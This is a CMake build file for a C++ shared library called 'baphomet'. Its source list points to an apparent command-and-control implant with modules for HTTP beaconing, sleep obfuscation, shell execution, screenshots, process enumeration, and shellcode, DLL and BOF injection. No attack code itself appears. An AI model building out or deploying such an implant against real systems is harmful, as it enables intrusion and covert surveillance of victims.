cmake_minimum_required(VERSION 3.28)
project(baphomet)

set(CMAKE_CXX_STANDARD 17)

add_library(baphomet SHARED main.cpp
        main.hpp
        networking/http/send.cpp
        util/structs.hpp
        util/function_ptrs.hpp
        util/common.hpp
        networking/http/init.cpp
        networking/http/recieve.cpp
        obfuscation/sleep.cpp
        obfuscation/sleep.hpp
        tasking/basic/filesystem.cpp
        tasking/basic/filesystem.hpp
        util/io.cpp
        util/io.hpp
        tasking/basic/shell.cpp
        tasking/basic/shell.hpp
        reconaissance/screenshot.cpp
        reconaissance/basic.cpp
        reconaissance/procenum.cpp
        tasking/injection/shellcode/shellcode.cpp
        tasking/injection/exe/runexe.cpp
        tasking/injection/injection.hpp
        tasking/injection/dll/rundll.cpp
        tasking/misc/misc.cpp
        tasking/misc/misc.hpp
        tasking/injection/bof/runbof.cpp
        tasking/injection/bof/beacon_api.cpp
        tasking/injection/bof/beacon_api.hpp
        util/macro.hpp
        networking/http/http.hpp
        reconaissance/reconaissance.hpp
)
